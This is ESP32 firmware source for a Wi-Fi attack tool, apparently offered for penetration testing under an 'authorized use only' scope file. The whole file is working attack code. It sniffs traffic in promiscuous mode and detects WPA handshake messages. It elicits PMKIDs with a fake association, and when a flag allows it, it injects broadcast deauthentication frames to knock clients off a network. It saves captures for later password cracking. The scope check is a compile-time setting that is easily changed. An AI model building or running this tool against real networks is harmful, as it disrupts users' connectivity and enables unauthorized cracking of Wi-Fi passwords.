// esp32-recon — scoped WiFi assessment capture firmware for ESP32
// -----------------------------------------------------------------------------
// FOR AUTHORIZED USE ONLY. This firmware operates only against BSSIDs compiled
// into scope.h from your signed scope.yaml. Anything not in scope is refused.
//
// Capabilities:
//   * scan      — passive AP reconnaissance (transmits nothing disruptive)
//   * pmkid     — clientless PMKID capture from an in-scope AP (no deauth)
//   * handshake — 4-way handshake capture; optional brief targeted deauth,
//                 only if SCOPE_ALLOW_DEAUTH == 1 (rules of engagement permit)
//
// Captured frames are written as a PCAP (LINKTYPE_IEEE802_11) to the SD card,
// alongside a capture log. Analysis/cracking happens off-device (see analysis/).
//
// Drive it over USB serial (115200). Commands: help, scan, list, target <n>,
// pmkid, handshake, stop, status.
// -----------------------------------------------------------------------------

#include <Arduino.h>
#include <WiFi.h>
#include <SD.h>
#include <SPI.h>
#include "esp_wifi.h"
#include "scope.h"

// ---- Board config: set SD chip-select for your wiring -----------------------
#ifndef SD_CS_PIN
#define SD_CS_PIN 5
#endif

// ---- Deauth budget (only used when SCOPE_ALLOW_DEAUTH) ----------------------
// Kept intentionally small: a brief nudge to capture a handshake, not a flood.
static const int   DEAUTH_BURST_FRAMES = 5;    // frames per burst
static const int   DEAUTH_MAX_BURSTS   = 3;    // hard cap per handshake attempt
static const uint32_t DEAUTH_GAP_MS    = 2000; // spacing between bursts

// ---- State ------------------------------------------------------------------
enum Mode { IDLE, SCAN, PMKID, HANDSHAKE };
static volatile Mode g_mode = IDLE;
static int  g_target = -1;                 // index into SCOPE_TARGETS
static File g_pcap;
static File g_log;
static uint32_t g_frames_written = 0;
static bool g_pmkid_seen = false;
static uint8_t g_hs_msgs = 0;              // bitmask of M1..M4 seen

// ---- PCAP writer ------------------------------------------------------------
#pragma pack(push, 1)
struct pcap_hdr_t {
  uint32_t magic;    uint16_t vmaj; uint16_t vmin;
  int32_t  thiszone; uint32_t sigfigs;
  uint32_t snaplen;  uint32_t network;
};
struct pcaprec_hdr_t {
  uint32_t ts_sec; uint32_t ts_usec; uint32_t incl_len; uint32_t orig_len;
};
#pragma pack(pop)

static bool pcap_open(const char* path) {
  g_pcap = SD.open(path, FILE_WRITE);
  if (!g_pcap) return false;
  pcap_hdr_t h = {0xa1b2c3d4, 2, 4, 0, 0, 65535, 105 /* LINKTYPE_IEEE802_11 */};
  g_pcap.write((uint8_t*)&h, sizeof(h));
  g_pcap.flush();
  return true;
}

static void pcap_write(const uint8_t* buf, uint32_t len) {
  if (!g_pcap) return;
  uint32_t now = millis();
  pcaprec_hdr_t r = {now / 1000, (now % 1000) * 1000, len, len};
  g_pcap.write((uint8_t*)&r, sizeof(r));
  g_pcap.write(buf, len);
  g_frames_written++;
  if ((g_frames_written & 0x0F) == 0) g_pcap.flush();
}

static void logline(const String& s) {
  Serial.println(s);
  if (g_log) { g_log.println(String(millis()) + " " + s); g_log.flush(); }
}

// ---- 802.11 helpers ---------------------------------------------------------
static bool mac_eq(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}

// True if this frame's addr1/2/3 involves the currently targeted BSSID.
static bool frame_matches_target(const uint8_t* p, int len) {
  if (g_target < 0 || len < 24) return false;
  const uint8_t* bssid = SCOPE_TARGETS[g_target].bssid;
  const uint8_t* a1 = p + 4, *a2 = p + 10, *a3 = p + 16;
  return mac_eq(a1, bssid) || mac_eq(a2, bssid) || mac_eq(a3, bssid);
}

// Locate an EAPOL (ethertype 0x888E) payload inside a data frame; return offset
// of the EAPOL header or -1. Handles the standard LLC/SNAP encapsulation.
static int eapol_offset(const uint8_t* p, int len) {
  uint8_t ftype = (p[0] >> 2) & 0x3;
  if (ftype != 0x2) return -1;                 // not a data frame
  int hdr = 24;
  uint8_t subtype = (p[0] >> 4) & 0xF;
  if (subtype & 0x08) hdr += 2;                // QoS data: +2 bytes
  // LLC/SNAP: AA AA 03 00 00 00 <ethertype>
  if (len < hdr + 8) return -1;
  const uint8_t* llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return -1;
  if (!(llc[6] == 0x88 && llc[7] == 0x8E)) return -1;
  return hdr + 8;
}

// Very small EAPOL-Key inspector: figure out which of M1..M4 this is, and
// whether an RSN PMKID KDE is present (00 0F AC 04) in message 1.
static void inspect_eapol(const uint8_t* p, int len, int eo) {
  if (eo < 0 || len < eo + 4) return;
  const uint8_t* e = p + eo;
  if (e[1] != 0x03) return;                    // EAPOL type must be Key
  if (len < eo + 99) return;                   // need full key frame
  uint16_t key_info = (e[5] << 8) | e[6];
  bool mic     = key_info & (1 << 8);
  bool ack     = key_info & (1 << 7);
  bool install = key_info & (1 << 6);
  bool secure  = key_info & (1 << 9);
  // Standard classification of the 4-way handshake messages:
  if (ack && !mic)                 { g_hs_msgs |= 0x1; }            // M1
  else if (mic && !ack && !secure) { g_hs_msgs |= 0x2; }            // M2
  else if (mic && ack && install)  { g_hs_msgs |= 0x4; }            // M3
  else if (mic && secure && !ack)  { g_hs_msgs |= 0x8; }            // M4

  // PMKID lives in the Key Data of M1. Scan key-data for the RSN PMKID KDE.
  if (g_hs_msgs & 0x1) {
    for (int i = eo + 95; i + 4 < len; i++) {
      if (p[i] == 0xDD && p[i+2] == 0x00 && p[i+3] == 0x0F &&
          p[i+4] == 0xAC && (i+5 < len) && p[i+5] == 0x04) {
        if (!g_pmkid_seen) { g_pmkid_seen = true; logline("[+] PMKID observed"); }
        break;
      }
    }
  }
}

// ---- Promiscuous RX callback ------------------------------------------------
static void IRAM_ATTR rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (g_mode == IDLE || g_mode == SCAN) return;
  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  if (!frame_matches_target(payload, len)) return;

  int eo = eapol_offset(payload, len);
  if (eo >= 0) {
    inspect_eapol(payload, len, eo);
    pcap_write(payload, len);
    return;
  }
  // Also keep the target's beacon (helps tools tie SSID<->BSSID<->handshake).
  uint8_t ftype = (payload[0] >> 2) & 0x3;
  uint8_t subtype = (payload[0] >> 4) & 0xF;
  if (ftype == 0x0 && subtype == 0x8) pcap_write(payload, len);
}

// ---- Deauth (gated) ---------------------------------------------------------
#if SCOPE_ALLOW_DEAUTH
// Targeted deauth to broadcast on the target BSSID, sent as a small bounded
// burst. Purpose: prompt an associated client to reassociate so we capture the
// handshake. NOT a continuous jammer.
static void send_deauth_burst(const uint8_t* bssid) {
  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00,             // type/subtype = deauth
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1 = broadcast (any client)
    0,0,0,0,0,0,                        // addr2 = BSSID (filled below)
    0,0,0,0,0,0,                        // addr3 = BSSID (filled below)
    0x00, 0x00,                         // seq
    0x07, 0x00                          // reason = class-3 frame from nonassoc
  };
  memcpy(frame + 10, bssid, 6);
  memcpy(frame + 16, bssid, 6);
  for (int i = 0; i < DEAUTH_BURST_FRAMES; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    delay(2);
  }
}
#endif

// ---- Mode control -----------------------------------------------------------
static void set_channel(uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void stop_capture() {
  if (g_mode == PMKID || g_mode == HANDSHAKE) {
    esp_wifi_set_promiscuous(false);
    if (g_pcap) { g_pcap.flush(); g_pcap.close(); }
    logline("[*] Capture stopped. Frames written: " + String(g_frames_written));
    logline("    handshake msgs bitmask M1..M4 = 0x" + String(g_hs_msgs, HEX) +
            (g_pmkid_seen ? "  PMKID: yes" : "  PMKID: no"));
  }
  g_mode = IDLE;
}

static bool require_target() {
  if (g_target < 0) { logline("[!] No target selected. Use: target <n>"); return false; }
  return true;
}

static void start_capture(Mode m) {
  if (!require_target()) return;
  const scope_target_t& t = SCOPE_TARGETS[g_target];
  char name[32];
  snprintf(name, sizeof(name), "/cap_%02X%02X_%lu.pcap",
           t.bssid[4], t.bssid[5], (unsigned long)millis());
  if (!pcap_open(name)) { logline("[!] Could not open PCAP on SD"); return; }
  g_frames_written = 0; g_pmkid_seen = false; g_hs_msgs = 0;

  wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&rx_cb);
  esp_wifi_set_promiscuous(true);
  set_channel(t.channel);
  g_mode = m;

  logline(String("[*] ") + (m == PMKID ? "PMKID" : "Handshake") +
          " capture on " + t.ssid + " ch " + t.channel + " -> " + name);

  if (m == HANDSHAKE) {
#if SCOPE_ALLOW_DEAUTH
    logline("[*] Deauth permitted by scope; sending bounded targeted bursts.");
    for (int b = 0; b < DEAUTH_MAX_BURSTS; b++) {
      send_deauth_burst(t.bssid);
      delay(DEAUTH_GAP_MS);
      if (__builtin_popcount(g_hs_msgs) >= 2) break; // enough of the handshake
    }
    logline("[*] Deauth bursts done; continuing passive capture. 'stop' to end.");
#else
    logline("[*] Deauth NOT permitted by scope. Waiting passively for a natural");
    logline("    client (re)association. 'stop' to end.");
#endif
  } else {
    logline("[*] Requesting association to elicit PMKID (clientless)...");
    // A single association attempt to the target usually elicits M1 w/ PMKID.
    WiFi.begin(t.ssid, "wrongpassword-eliciting-m1");
    delay(1500);
    WiFi.disconnect(true);
    logline("[*] Passive capture continues. 'stop' to end.");
  }
}

// ---- Scan -------------------------------------------------------------------
static void do_scan() {
  logline("[*] Scanning (passive recon)...");
  int n = WiFi.scanNetworks(false, true);
  logline("[*] Found " + String(n) + " AP(s):");
  for (int i = 0; i < n; i++) {
    bool in_scope = false;
    for (int j = 0; j < SCOPE_TARGET_COUNT; j++)
      if (mac_eq(WiFi.BSSID(i), SCOPE_TARGETS[j].bssid)) in_scope = true;
    logline("  " + WiFi.BSSIDstr(i) + "  ch" + String(WiFi.channel(i)) +
            "  " + String(WiFi.RSSI(i)) + "dBm  " +
            (in_scope ? "[IN SCOPE] " : "           ") + WiFi.SSID(i));
  }
  WiFi.scanDelete();
}

static void list_targets() {
  logline("[*] In-scope targets (allow_deauth=" + String(SCOPE_ALLOW_DEAUTH) + "):");
  for (int i = 0; i < SCOPE_TARGET_COUNT; i++) {
    char b[18];
    const uint8_t* m = SCOPE_TARGETS[i].bssid;
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0],m[1],m[2],m[3],m[4],m[5]);
    logline("  [" + String(i) + "] " + b + " ch" +
            String(SCOPE_TARGETS[i].channel) + "  " + SCOPE_TARGETS[i].ssid);
  }
}

// ---- Serial command loop ----------------------------------------------------
static void handle_cmd(String cmd) {
  cmd.trim();
  if (cmd == "help") {
    logline("Commands: help | scan | list | target <n> | pmkid | handshake | stop | status");
  } else if (cmd == "scan") {
    do_scan();
  } else if (cmd == "list") {
    list_targets();
  } else if (cmd.startsWith("target ")) {
    int n = cmd.substring(7).toInt();
    if (n >= 0 && n < SCOPE_TARGET_COUNT) {
      g_target = n; logline("[*] Target set: " + String(SCOPE_TARGETS[n].ssid));
    } else logline("[!] Out of range. See 'list'.");
  } else if (cmd == "pmkid") {
    start_capture(PMKID);
  } else if (cmd == "handshake") {
    start_capture(HANDSHAKE);
  } else if (cmd == "stop") {
    stop_capture();
  } else if (cmd == "status") {
    logline("[*] mode=" + String((int)g_mode) + " target=" + String(g_target) +
            " frames=" + String(g_frames_written) +
            " M1..M4=0x" + String(g_hs_msgs, HEX) +
            (g_pmkid_seen ? " PMKID:yes" : " PMKID:no"));
  } else if (cmd.length()) {
    logline("[!] Unknown: '" + cmd + "'. Try 'help'.");
  }
}

void setup() {
  Serial.begin(115200);
  delay(300);
  logline("== esp32-recon (AUTHORIZED USE ONLY) ==");
  logline("Scope: " + String(SCOPE_TARGET_COUNT) + " target(s), allow_deauth=" +
          String(SCOPE_ALLOW_DEAUTH));

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  if (!SD.begin(SD_CS_PIN)) {
    logline("[!] SD init failed — captures cannot be saved. Fix wiring/SD_CS_PIN.");
  } else {
    g_log = SD.open("/capture.log", FILE_APPEND);
    logline("[*] SD ready. Log -> /capture.log");
  }
  list_targets();
  logline("Type 'help'.");
}

void loop() {
  static String line;
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') { if (line.length()) { handle_cmd(line); line = ""; } }
    else line += c;
  }
  delay(5);
}
